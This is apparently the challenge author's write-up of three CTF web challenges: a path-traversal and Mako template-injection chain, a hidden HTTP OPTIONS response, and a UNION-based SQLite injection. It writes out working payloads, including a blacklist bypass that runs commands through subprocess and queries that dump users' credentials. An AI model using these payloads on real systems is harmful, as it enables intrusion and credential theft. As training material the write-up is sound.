+++
title = "CAT CTF 26 — Entry Level (Author Write-Ups)"
date = "2026-03-23"
tags = ["CTF", "Web", "Author"]
description = "Write-ups for 3 web challenges I created at CAT CTF 26: Admin Jokes, Forest Secrets, and Paper Tail."
difficulty = "easy"
+++
Hello everyone, this is my first time being an author for a CTF competition. I created 6 web challenges, one misc challenge, and one Linux jail. It was a very exciting experience for me to have this opportunity.

Let's go and see how to solve the most important web challenges.

## Admin Jokes

Disc: Admin is a wise man; he doesn't say silly jokes.

**The intended chain of the challenge:**

1. Find and use the LFI in `/jokes`.
2. Read the application source to discover the important endpoint and sink.
3. Exploit the Mako SSTI in `/admin/profile`.
4. Use code execution to run the setuid helper and print the real flag.

After opening the challenge you will get this dashboard.

After navigate to the jokes you will see some really jokes but each of them give small hints for you:

> Joke 3: I asked the server what its favorite hobbies were. It said, I can't tell you, those are **private variables**.

> Joke 4: What's a hacker's favorite type of music? Heavy metal… because they love breaking into **systems**!

> Joke 5: A programmer's favorite place to hide secrets? In the **environment**! You can't see them, but they're always there.

Some hints like **environment, private variables, and systems** may give clues about the env variables.

Let's exploit the LFI then. This confirms the existence of LFI vuln. If you search about a flag you will get a fake one. Now search about the source code — there many ways to get the source code but the intended is `/system/app.py` and you will get the source code:

**The core bug is effectively:**

```python
file_path = f"{JOKES_DIR}/{joke_id}"
```

There is no normalization or sanitization, so `../` traversal works.

```python
"""
Admin Profile Preview Module

This module handles admin profile previews with Mako templates.
Security: Input validation applied before template rendering.

Note: Some dangerous functions are filtered for security.
"""

from flask import request, Response
from mako.template import Template


def render_profile(name):
    """
    Renders admin profile using Mako template engine.

    Security measures:
    - Input sanitization applied
    - Blacklist filter for dangerous keywords
    - Direct template rendering (fast performance)

    Known filtered terms include things like:
    - System-level operations
    - Code evaluation functions
    - Module import mechanisms
    - Process execution calls
    """

    # Security filter applied here
    lowered = name.lower()

    # Filter implementation (exact terms not shown for security)
    # ... blacklist checking logic ...

    template = Template(f"<h2>Admin Profile</h2><p>Welcome, {name}</p>")
    return template.render()


# Exposed endpoint:
# GET /admin/profile?name=
```

The source code shows that the **name** parameter is a server-side template injection sink. And the source also shows there are some filters or blacklist, so the target is:

1. Reach `/admin/profile`.
2. Use **Mako** expression syntax.
3. Bypass the weak blacklist.

### Confirm the SSTI

Mako expressions use `${…}`.

A quick test: `/admin/profile?name=${7*7}` → you will get `Welcome, 49`, so SSTI is confirmed.

### Bypass the blacklist

The blacklist is only doing a lowercase substring check on the raw input. It does not understand Python expressions.

That means blocked words can be split into pieces and **concatenated** at runtime.

For example, this avoids the literal string **subprocess**:

```
__import__('su'+'bpro'+'cess')
```

A working proof-of-execution payload is:

```
${__import__('su'+'bpro'+'cess').check_output(['id']).decode()}
```

Note: There are many ways to bypass the filters and the concatenation is just one of them.

After confirming the exploit of SSTI, we should search about the flag, so using `ls` is helpful to list all files and directories:

```
${__import__('su'+'bpro'+'cess').check_output(['ls','-la','/']).decode()}
```

The flag is in **readflagbinary** so let's read it:

```
${__import__('su'+'bpro'+'cess').check_output(['/readflagbinary']).decode()}
```

> Your flag is : **CATF{Mak0_LF1_2_SSTI_Adm1n_J0k3s_Pwn3d_9f4e2b7c}**

## Forest Secrets

A web challenge disguised as a terminal-style story game.

At first glance, the player only sees four visible choices at each stage of the story. The real trick is that one important piece of information is not exposed through a normal **GET** request. The intended solve is to reach the gate, notice the clue, inspect how the web app communicates, and then use a different HTTP method to recover the hidden command.

**What the Challenge Is Testing**

This challenge is mainly about:

- Basic web recon
- Understanding that endpoints may behave differently depending on the HTTP method
- Checking headers, not just response bodies

When you open the challenge, you'll get a terminal-like interface with a story and 4 options to do.

After you burn some time checking the 4 options you will know the right path to follow is:

`HEAD TOWARD THE LANTERN LIGHT` → `ENTER THE ABANDONED SHRINE` → `READ THE CARVED TABLET` → `OPEN THE IRON GATE`

You will get an important thing: **WHAT IS THE SECRET COMMAND?**

Our mission now is to search for this command. If you see the request in burp, there are the options and none of them is the secret. If you read the source code you won't see anything important too, but if you see the `robots.txt` you will see a hint.

This leads you to manipulate the HTTP methods you know like GET, POST, PUT, HEAD, OPTIONS, etc in burp.

If you tried them one by one you will get the secret by using **OPTIONS:**

So the secret is **ASK THE FOREST FOR A FIFTH PATH.** If you send it only in stage 4 you will get the flag.

## Paper Tail

This challenge is a good example of why "normal-looking search" pages are worth testing carefully. From the outside, we only get a small blog-style site, a search bar, and an `/admin` login page. The full solve path is:

1. Recon the public routes.
2. Prove `/search` is injectable with `UNION SELECT`.
3. Find the correct column count.
4. Enumerate the SQLite schema.
5. Dump five useful tables.
6. Recover admin credentials and the hidden export path.
7. Log in, pull the PDF export, and read the flag from PDF metadata.

This is the landing dashboard. We have a blog search function. If you look for `robots.txt` you will see we have an admin endpoint too and you need to log in.

If you tried SQLi in the login page you won't get anything, but let's check if the search functionality is vulnerable or not.

If you tried boolean based like `0' OR 1=1--` you will see it's not vulnerable, but if you tried UNION BASED like `0' UNION SELECT NULL--` you will get an error and this is a PoC of vulnerability existence.

You will add each time a new NULL till you get **200 OK** when writing 5 times which shows that there are 5 columns:

```sql
0' UNION SELECT NULL,NULL,NULL,NULL,NULL --
```

### Enumerate the SQLite schema

Because the blog talks about SQL Lite master, the first thing you should try is to ensure that the database is SQL LITE:

```sql
0' UNION ALL SELECT 1,name,sql,4,5 FROM sqlite_master WHERE type='table' --
```

This dumps the database tables and their column names. These tables are our target:

> **inv_9f2e_catalog, img_14ad_assets, migr_71c9_principals, cfg_f201_panels, sess_8c1d_store, audit_b55c_log, docs_4a3e_legacy**

At this point, the best attacker mindset is:

- **migr_*** probably contains credentials.
- **docs_*** probably contains references, files, or internal paths.
- **cfg_*** can reveal routes and feature names.
- **audit_*** can hint at internal workflows.
- **img_*** is probably noise, but it is still useful to confirm the data model.

**Table 1: migr_71c9_principals**

```sql
0' UNION ALL SELECT principal_id,handle,secret_material||' | tier='||policy_tier||' | enabled='||enabled,4,5 FROM migr_71c9_principals --
```

- warehouse → st0ck-sync-2024 | tier=user | enabled=1
- support → t1cket-queue-bot | tier=user | enabled=1
- auditbot → cron$service#88 | tier=svc | enabled=1
- admin → yR7!q1_profile@pack | tier=admin | enabled=1

You can get the admin credentials only if you know there is a user called admin:

```sql
0' union select principal_id,handle,secret_material,policy_tier,null from migr_71c9_principals where policy_tier='admin' --
```

So we got → `admin:yR7!q1_profile@pack`

**Table 2: docs_4a3e_legacy**

```sql
0' UNION ALL SELECT doc_id,doc_ref,storage_path||' | owner='||owner_handle,4,5 FROM docs_4a3e_legacy --
```

- legacy-profile-pack-8f3d → /admin/profile/export?ref=legacy-profile-pack-8f3d | owner=admin

This is already enough to suspect the final stage:

- There is an authenticated export route
- It takes a ref parameter
- The interesting object belongs to **admin**

**Table 3: cfg_f201_panels**

```sql
0' UNION ALL SELECT panel_id,panel_name,route_name||' | hidden='||is_hidden,4,5 FROM cfg_f201_panels --
```

- overview → /admin/profile | hidden=0
- sessions → /admin/profile | hidden=0
- preferences → /admin/profile | hidden=0
- api-keys → /admin/profile/api-keys | hidden=1
- history → /admin/profile/history | hidden=1

This confirms that `/admin/profile` is the main post-login target and that there are hidden routes behind the admin UI.

**Table 4: audit_b55c_log**

```sql
0' UNION ALL SELECT audit_id,event_name,COALESCE(actor_handle,'')||' | '||created_at,4,5 FROM audit_b55c_log --
```

- EXPORT_PIPELINE_BOOT → auditbot | 2026-03-23T02:09:41.933Z
- PANEL_INDEX_REFRESH → auditbot | 2026-03-23T02:09:41.933Z

**Table 5: img_14ad_assets**

```sql
0' UNION ALL SELECT asset_id,storage_key,'product='||product_id||' | alt='||alt_text,4,5 FROM img_14ad_assets --
```

- hero/papertail-gradient → product=1 | alt=Paper Tail cover art
- thumbs/blog-index → product=2 | alt=Blog index thumbnail

### Final Steps

Now we have all the content of the database, the remaining steps are:

1. Login with the admin credentials
2. Go to the path we found in the docs table

After logging in, go to `/admin/profile/export?ref=legacy-profile-pack-8f3d` and a PDF will be downloaded.

To see its metadata you need to use `exiftool`:

Some encoded strings:

- Author : `Q0FURntQNFAzcl90cjQxbF8=`
- Subject : `dGhyMHVnSF9TUUxpbl9CeV9kYjFNfQ==`

After decoding them you will get the flag:

> **CATF{P4P3r_tr41l_thr0ugH_SQLin_By_db1M}**
